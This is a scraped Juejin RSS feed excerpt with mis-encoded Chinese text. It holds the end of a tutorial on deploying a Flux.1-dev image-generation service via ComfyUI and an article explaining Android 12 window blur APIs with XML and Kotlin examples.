  <span class="hljs-string">"prompt"</span>: {
    // å·¥ä½œæµJSONé…ç½®
  }
}

<span class="hljs-comment"># è¿”å›ç»“æœ</span>
{
  <span class="hljs-string">"id"</span>: <span class="hljs-string">"è¯·æ±‚ID"</span>,
  <span class="hljs-string">"images"</span>: [<span class="hljs-string">"base64ç¼–ç çš„å›¾ç‰‡"</span>]
}
</code></pre>
<p>å…·ä½“æ­¥éª¤ï¼š</p>
<ol>
<li>åœ¨ComfyUIä¸­å¯¼å‡ºAPIæ ¼å¼çš„å·¥ä½œæµJSON</li>
<li>é€šè¿‡POSTMANæˆ–ä»£ç å‘3000ç«¯å£å‘é€è¯·æ±‚</li>
<li>ç›´æ¥è·å¾—ç”Ÿæˆçš„å›¾ç‰‡æ•°æ®</li>
</ol>
<p>é«˜çº§ç”¨æˆ·è¿˜å¯ä»¥é…ç½®<code>webhook</code>å‚æ•°ï¼Œå®ç°å¼‚æ­¥é€šçŸ¥ã€‚</p>
<h2 data-id="heading-10">è¿›é˜¶ç©æ³•</h2>
<p>å¦‚æœæƒ³è‡ªå®šä¹‰æ¨¡å‹æˆ–æ·»åŠ æ’ä»¶ï¼š</p>
<ol>
<li><strong>ä¸‹è½½æ¨¡å‹æ–‡ä»¶</strong>ï¼šä»Hugging Faceè·å–æ‰€éœ€çš„4ä¸ªæ ¸å¿ƒæ¨¡å‹æ–‡ä»¶</li>
<li><strong>ä¿®æ”¹Dockerfile</strong>ï¼šå‚è€ƒå¼€æºé¡¹ç›®çš„Dockerfileï¼Œæ·»åŠ è‡ªå®šä¹‰å±‚</li>
<li><strong>æ„å»ºé•œåƒ</strong>ï¼šæ‰§è¡Œ<code>docker build</code>å‘½ä»¤ç”Ÿæˆä¸ªæ€§åŒ–é•œåƒ</li>
<li><strong>ä¸Šä¼ éƒ¨ç½²</strong>ï¼šå°†é•œåƒæ¨é€åˆ°å¹³å°ä»“åº“åéƒ¨ç½²</li>
</ol>
<h2 data-id="heading-11">çœé’±å°è´´å£«</h2>
<ul>
<li>ç”¨å®Œå³åœï¼šä¸éœ€è¦æ—¶è®°å¾—åœæ­¢æœåŠ¡ï¼ŒæŒ‰å®é™…ä½¿ç”¨æ—¶é•¿è®¡è´¹</li>
<li>æ¨¡å‹ç¼“å­˜ï¼šåŒä¸€åŒºåŸŸçš„èŠ‚ç‚¹ä¼šç¼“å­˜é•œåƒï¼ŒäºŒæ¬¡å¯åŠ¨é€Ÿåº¦æ›´å¿«</li>
<li>é€‰æ‹©spotå®ä¾‹ï¼šéç´§æ€¥ä»»åŠ¡å¯é€‰æŠ¢å å¼å®ä¾‹ï¼Œä»·æ ¼æ›´ä½</li>
</ul>
<h2 data-id="heading-12">3åˆ†é’Ÿä½“éªŒæ€»ç»“</h2>
<p>ç°åœ¨ï¼Œä½ å·²ç»æ‹¥æœ‰äº†ä¸€ä¸ªï¼š</p>
<ul>
<li>âœ… æ”¯æŒé¡¶çº§Flux.1-devæ¨¡å‹çš„æ–‡ç”Ÿå›¾æœåŠ¡</li>
<li>âœ… åŒæ—¶æä¾›å¯è§†åŒ–ç•Œé¢å’ŒAPIæ¥å£</li>
<li>âœ… å¯å…¬ç½‘è®¿é—®çš„ä¸“å±åº”ç”¨</li>
<li>âœ… æŒ‰éœ€è®¡è´¹ï¼Œæˆæœ¬å¯æ§</li>
</ul>
<p>æ— è®ºæ˜¯æ­å»ºä¸ªäººAIç»˜ç”»å·¥ä½œå®¤ï¼Œè¿˜æ˜¯ä¸ºäº§å“é›†æˆæ–‡ç”Ÿå›¾åŠŸèƒ½ï¼Œè¿™å¥—æ–¹æ¡ˆéƒ½èƒ½è®©ä½ å¿«äººä¸€æ­¥ã€‚ç«‹å³åŠ¨æ‰‹ï¼Œå¼€å¯ä½ çš„AIåˆ›ä½œä¹‹æ—…å§ï¼</p>
<hr/>
<p><em>å®Œæ•´æŠ€æœ¯ç»†èŠ‚å’Œè‡ªå®šä¹‰é•œåƒæŒ‡å—å¯å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fslmnb-lab%2FFluxEz" target="_blank" title="https://github.com/slmnb-lab/FluxEz" ref="nofollow noopener noreferrer">FluxEzå¼€æºé¡¹ç›®</a></em></p>
<p><em>æŠ€æœ¯æ–‡æ¡£<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.gongjiyun.com%2Fdocs%2Fy%2Fofl0wheysi5kwhkh2nfcownhnxf%2Fnmrawkpjai6syskqauscb2zmnjo%2F%231-%25E5%25BC%2580%25E6%25BA%2590%25E6%25A1%2588%25E4%25BE%258B" target="_blank" title="https://www.gongjiyun.com/docs/y/ofl0wheysi5kwhkh2nfcownhnxf/nmrawkpjai6syskqauscb2zmnjo/#1-%E5%BC%80%E6%BA%90%E6%A1%88%E4%BE%8B" ref="nofollow noopener noreferrer"> Flux.1-dev æ–‡ç”Ÿå›¾æ¨¡å‹åº”ç”¨ | å…±ç»©ç®—åŠ›</a></em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android é«˜æ–¯æ¨¡ç³Šï¼ˆ1ï¼‰ çª—å£æ¨¡ç³ŠåŠjavaä¾§åŸºæœ¬æµç¨‹ç®€è¿°]]></title>    <link>https://juejin.cn/post/7589052659436634158</link>    <guid>https://juejin.cn/post/7589052659436634158</guid>    <pubDate>2025-12-29T15:00:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589052659436634158" data-draft-id="7589104492883001396" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android é«˜æ–¯æ¨¡ç³Šï¼ˆ1ï¼‰ çª—å£æ¨¡ç³ŠåŠjavaä¾§åŸºæœ¬æµç¨‹ç®€è¿°"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-29T15:00:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— è¨€Echo"/> <meta itemprop="url" content="https://juejin.cn/user/942714871630682"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android é«˜æ–¯æ¨¡ç³Šï¼ˆ1ï¼‰ çª—å£æ¨¡ç³ŠåŠjavaä¾§åŸºæœ¬æµç¨‹ç®€è¿°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/942714871630682/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— è¨€Echo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T15:00:34.000Z" title="Mon Dec 29 2025 15:00:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Android 12èµ·ï¼ŒåŸç”Ÿæ”¯æŒäº†çª—å£æ¨¡ç³Šæ¥å£èƒ½åŠ›ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fsource.android.google.cn%2Fdocs%2Fcore%2Fdisplay%2Fwindow-blurs" target="_blank" title="https://source.android.google.cn/docs/core/display/window-blurs" ref="nofollow noopener noreferrer">Window blurs Â |Â  Android Open Source Project</a></p>
<p>æŒ‰ç…§å®˜æ–¹çš„æè¿°åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§</p>
<ol>
<li>
<p>blur behind ï¼šä½¿çª—å£åé¢çš„æ•´ä¸ªå±å¹•å˜å¾—æ¨¡ç³Š</p>
</li>
<li>
<p>background blur ï¼šä½¿æŒ‡å®šåŒºåŸŸçš„åº•å±‚å†…å®¹æ¨¡ç³Š</p>
</li>
</ol>
<p>å…¶æœ¬è´¨éƒ½æ˜¯å¯¹å½“å‰surfaceåé¢çš„surfaceè¿›è¡Œæ¨¡ç³Šæ˜¾ç¤ºã€‚</p>
<ol>
<li>
<h2 data-id="heading-0">blur behind</h2>
</li>
</ol>
<p>å…¬å¼€æ¥å£å¯é€šè¿‡ä¸»é¢˜é…ç½®æˆ–è€…ä»£ç è®¾ç½®ï¼Œä¸¤ç§æ–¹å¼ä»»é€‰å…¶ä¸€</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"BlurBehind"</span> <span class="hljs-attr">parent</span>=<span class="hljs-string">"Theme.CarLauncher"</span>&gt;</span><span class="xml">
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowIsTranslucent"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowBlurBehindEnabled"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowBlurBehindRadius"</span>&gt;</span>70dp<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä»£ç æ–¹å¼è®¾ç½®</span>
window.addFlags(WindowManager.LayoutParams.FLAG_BLUR_BEHIND)
window.attributes = window.attributes.apply {
 blurBehindRadius = <span class="hljs-number">70</span>
} 
</code></pre>
<p>blurBehindRadiuså‚æ•°ä¼šä¼ é€’åˆ°system_serverç«¯ WindowStateä¸­ï¼Œç”±Dimmerè®¾ç½®ï¼ˆæ–°å»ºäº†ä¸€ä¸ªdimLayerï¼‰ï¼Œæœ€ç»ˆæ˜¯è°ƒç”¨</p>
<p><strong>setBackgroundBlurRadius</strong> æ¥å£</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38885f22a2d54b76a42a23241b511889~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=uLrsUHizsIk8Bt0Eb2UBsObj7Hg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b95e49a5ac564dc6b54d97a5e18d7a3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=cqN%2FCuUoRJUwIwbuEaz1OYFO8Rg%3D" alt="" loading="lazy"/></p>
<ol start="2">
<li>
<h2 data-id="heading-1">background blur</h2>
</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"BackgroundBlur"</span> <span class="hljs-attr">parent</span>=<span class="hljs-string">"Theme.CarLauncher"</span>&gt;</span><span class="xml">
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowIsTranslucent"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowBackgroundBlurRadius"</span>&gt;</span>70dp<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä»£ç æ–¹å¼è®¾ç½®</span>
 window.setBackgroundBlurRadius(<span class="hljs-number">70</span>)
</code></pre>
<p>setBackgroundBlurRadiusæ—¶åšäº†ä»€ä¹ˆäº‹ï¼Ÿ</p>
<p>ä»…ä»…æ˜¯åˆ›å»ºäº†ä¸€ä¸ªBackgroundBlurDrawableå¹¶è®¾ç½®åˆ°DecorViewçš„èƒŒæ™¯ä¸­</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c8242d0de5e489db4346902c98ed75a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=4%2B1NzU9SSwFTHsgzHNEOP45IBco%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a97ccb75c7ef46dd89dbb14bc2225ea8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=1NekvljeOUmbhgjztBwOD%2FNaWdI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cd202f6f58b4148b27d3ac93a85cf6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=AxP3Kc51hRe0RG9AwsTbSjH69Pg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86f78b3f3b894131810b21552959ec7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=GdgexbvN8CQLO97hFyZPZ2TwicQ%3D" alt="" loading="lazy"/></p>
<ol>
<li>
<h3 data-id="heading-2">BackgroundBlurDrawable</h3>
</li>
</ol>
<p>BackgroundBlurDrawableåˆ°åº•åšäº†ä»€ä¹ˆç¥å¥‡çš„äº‹æƒ…å®ç°äº†èƒŒæ™¯é«˜æ–¯æ¨¡ç³Šï¼Ÿ</p>
<p>BackgroundBlurDrawableä»£ç åªæœ‰çŸ­çŸ­å‡ ç™¾è¡Œï¼Œç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œ</p>
<p>æ ¸å¿ƒåªæ˜¯ï¼š<strong>è®°å½•ä¸‹æ¨¡ç³Šå‚æ•°ï¼šåæ ‡èŒƒå›´ï¼Œåœ†è§’å€¼ï¼Œæ¨¡ç³ŠåŠå¾„ï¼Œé€æ˜åº¦ã€‚</strong></p>
<p>åœ†è§’å€¼ï¼Œæ¨¡ç³ŠåŠå¾„ï¼Œé€æ˜åº¦éƒ½å¯ä»¥é€šè¿‡BackgroundBlurDrawableå…¬å¼€æ¥å£è®¾ç½®ï¼Œä¸å¤šè§£é‡Šã€‚</p>
<p><strong>åæ ‡èŒƒå›´æ˜¯é€šè¿‡ç›‘å¬RenderNodeä½ç½®å˜åŒ–è·å¾—</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0da7f003c3a406eaad9037105573848~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=pBdup%2B7pfF159jkxLeTHKG58PJY%3D" alt="" loading="lazy"/></p>
<p>Aggregatorå¯ä»¥ä¿å­˜å¤šä¸ªBackgroundBlurDrawableï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š</p>
<p><strong>ä¸€ä¸ªçª—å£ä¸Šæ˜¯å¯ä»¥ä½¿ç”¨å¤šä¸ªBackgroundBlurDrawable</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62bef324ee9743a68df904db7d803c19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=1RmI5BVbtsDjjihoGSPWU4bEuuU%3D" alt="" loading="lazy"/></p>
<p>ä¸€ä¸ªViewRootImplå¯¹åº”ä¸€ä¸ªAggregatorï¼ŒAggregatorå¯¹åº”å¤šä¸ªBackgroundBlurDrawable</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3bca6321862415da846b47a477bf860~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=BD1Fk4LkDWGvXLyv%2BGCUrjONt0k%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>
<h3 data-id="heading-3">Aggregatorå¦‚ä½•è¿é€šViewRootImplå’ŒBackgroundBlurDrawable</h3>
</li>
</ol>
<p>æ¯ä¸€æ¬¡åˆ·æ–°ç•Œé¢æ—¶ï¼Œå¦‚æœAggregator<strong>æ¨¡ç³ŠåŒºåŸŸå‘ç”Ÿæ›´æ–°</strong>æˆ–è€…<strong>å­˜åœ¨æ¨¡ç³ŠåŒºåŸŸ</strong>ï¼Œ</p>
<p>ä¼šè¯»å–å½“å‰çš„æ¨¡ç³ŠåŒºåŸŸå‚æ•°ï¼Œå‘é€ç»™SurfaceFlingerç«¯</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f55a3d271c75425496e46dc8ab9cf3d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=o5BxBcijtKudKNKNT5Jg3MlTXtU%3D" alt="" loading="lazy"/></p>
<p>æ¯ä¸ªBackgroundBlurDrawableéƒ½å¯ä»¥è½¬æ¢æˆä¸€ä¸ªBlurRegionæ•°æ®ç»“æ„ï¼Œ</p>
<p>æ‰€ä»¥å¤šä¸ªDrawableå°±è½¬æ¢æˆäº†ä¸€ä¸ªBlurRegionæ•°ç»„</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/506fc8256c064e4eb9fa7be8ba63754e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=yqKkHCchXLPbrQdUNz3VCTSqFCk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0c4f247097c460692b603989bf0267d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=2ltsNLFJhGJdoCZBRnFuszCNkv0%3D" alt="" loading="lazy"/></p>
<p>ä¸€ä¸ªBlurRegionå¯ä»¥è½¬æ¢ä¸ºä¸€ä¸ªfloatæ•°ç»„ï¼Œé‚£ä¹ˆå¤šä¸ªBlurRegionå¯è½¬æ¢ä¸ºä¸€ä¸ªfloatäºŒç»´æ•°ç»„</p>
<p>å³ å¤šä¸ªBackgroundBlurDrawableè®°å½•çš„æ¨¡ç³Šå‚æ•°ï¼Œ<strong>æœ€ç»ˆè½¬æ¢æˆäº†floatäºŒç»´æ•°ç»„</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b413e97abc6d4db889d9117da757efc4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=TMWucEUgBWLsNGxvo3oKuOnl7DE%3D" alt="" loading="lazy"/></p>
<p>ç„¶åå°†è¡¨ç¤ºæ¨¡ç³Šå‚æ•°çš„floatäºŒç»´æ•°ç»„é€šè¿‡<strong>setBlurRegions</strong>ä¸‹è®¾</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/243b3673c5a6431eb4e74a50bc233b59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=VJXDf5UaoHQNNFDhzDa2U%2FI2Woo%3D" alt="" loading="lazy"/></p>
<p>æœ‰ä¸€ä¸ªç»†èŠ‚æ˜¯ï¼šç›‘å¬æ¨¡ç³Šåæ ‡èŒƒå›´mRectæ›´æ–°å¹¶æ²¡æœ‰ç«‹å³æ‰§è¡Œï¼Œè€Œæ˜¯ä½œä¸ºRunableå’Œå¸§æ•°ä¸€èµ·è®°ä¸‹ï¼Œåœ¨getBlurRegionsToDispatchToSfæ—¶å†çœŸæ­£æ‰§è¡Œï¼Œè¿™æ ·é¿å…äº†å¤šçº¿ç¨‹åŒæ­¥é—®é¢˜ã€‚</p>
<blockquote>
<p>å¦‚æœmRectç«‹å³æ›´æ–°ï¼Œè¯¥æ“ä½œåœ¨çº¿ç¨‹æ± ä¸­æ‰§è¡Œï¼Œæ— æ³•ä¿è¯æ‰§è¡Œé¡ºåºã€‚å‡å¦‚ç›‘å¬åˆ°ç¬¬100å¸§çš„RenderNoderä½ç½®å˜åŒ–mRectç«‹å³æ›´æ–°äº†ï¼Œä½†æ˜¯renderThreadæ­¤æ—¶æ­£åœ¨è¯·æ±‚æ¸²æŸ“ç¬¬99å¸§ï¼Œå´ä½¿ç”¨äº†ç¬¬100å¸§çš„ä½ç½®ï¼Œå°±ä¼šå‡ºç°ä½ç½®é”™ä½çš„é—®é¢˜ã€‚</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f553cd0d0af46f193898123ce1c733d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=8PZ%2FF9PLnWidqX3YpLavBI5DzpA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c71c90ac25d74c9390a56e8bf5a17b78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=BZ11JcLVgexRpfCMkHFyWUSQi5A%3D" alt="" loading="lazy"/></p>
<ol start="3">
<li>
<h2 data-id="heading-4">æ€»ç»“</h2>
</li>
</ol>
<p>ç»¼ä¸Šï¼Œblur behind æœ¬è´¨ä¸Šæ˜¯ä½¿ç”¨äº†<strong>setBackgroundBlurRadius</strong> <strong>ï¼Œ</strong> background bluræœ¬è´¨ä¸Šæ˜¯ä½¿ç”¨äº†<strong>setBlurRegions</strong>ã€‚</p>
<p>é‚£ä¹ˆåˆ©ç”¨ä¸Šé¢çš„æ¥å£ï¼Œå°±å¯ä»¥å®ç°surfaceçš„å®æ—¶æ¨¡ç³Šæ˜¾ç¤ºã€‚</p>
